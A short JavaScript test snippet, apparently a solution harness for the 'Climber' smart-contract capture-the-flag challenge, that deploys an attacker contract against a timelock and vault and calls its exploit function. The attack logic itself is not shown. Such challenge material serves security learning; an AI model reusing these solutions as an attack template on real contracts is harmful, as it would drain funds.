...
describe("[Challenge] Climber", function () {
  ...
  it("Exploit", async function () {
    ...
    const ClimberAttacker = await ethers.getContractFactory(
      "ClimberAttacker",
      attacker
    );

    this.attackerContract = await ClimberAttacker.deploy(
      this.timelock.address,
      this.vault.address,
      this.token.address
    );

    await this.attackerContract.connect(attacker).exploit({ gasLimit: 1e6 });
  });
